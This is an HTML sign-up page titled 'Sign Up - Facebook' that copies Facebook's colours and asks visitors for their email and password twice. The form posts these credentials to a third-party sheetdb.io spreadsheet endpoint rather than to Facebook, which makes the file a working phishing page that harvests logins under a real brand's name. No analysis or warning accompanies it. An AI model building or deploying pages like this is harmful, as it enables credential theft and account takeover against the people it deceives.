<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign Up - Facebook</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border: 1px solid #ccc;
            text-align: left;
        }
        h1 {
            color: #1877f2;
            text-align: center;
        }
        hr {
            border: 1px solid #f1f1f1;
            margin-bottom: 20px;
        }
        label {
            font-weight: bold;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0 20px 0;
            display: inline-block;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .clearfix::after {
            content: "";
            clear: both;
            display: table;
        }
        .signupbtn, .cancelbtn {
            padding: 10px 18px;
            width: 100%;
            font-size: 16px;
            margin: 5px 0;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .signupbtn {
            background-color: #1877f2;
            color: white;
        }
        .cancelbtn {
            background-color: #f44336;
            color: white;
        }
        .signupbtn:hover {
            background-color: #166fe5;
        }
        .cancelbtn:hover {
            background-color: #e53935;
        }
    </style>
</head>
<body>
    <form action="https://sheetdb.io/api/v1/jyvozqpnwd2sg" method="post" id="sheetdb-form"  >
        <div class="container">
            <h1>Sign Up</h1>
            <p>Please fill in this form to create an account.</p>
            <hr>

            <label for="email"><b>Email</b></label>
            <input type="text" placeholder="Enter Email" name="data[email]" required>

            <label for="psw"><b>Password</b></label>
            <input type="password" placeholder="Enter Password" name="data[psw]" required>

            <label for="psw-repeat"><b>Repeat Password</b></label>
            <input type="password" placeholder="Repeat Password" name="data[psw-repeat]" required>

            <label>
                <input type="checkbox" checked="checked" name="remember" style="margin-bottom:15px"> Remember me
            </label>

            <p>By creating an account you agree to our <a href="#" style="color:dodgerblue">Terms & Privacy</a>.</p>

            <div class="clearfix">
                <button type="button" class="cancelbtn">Cancel</button>
                <button type="submit" class="signupbtn">Sign Up</button>
            </div>
        </div>
    </form>

   

</body>
</html>
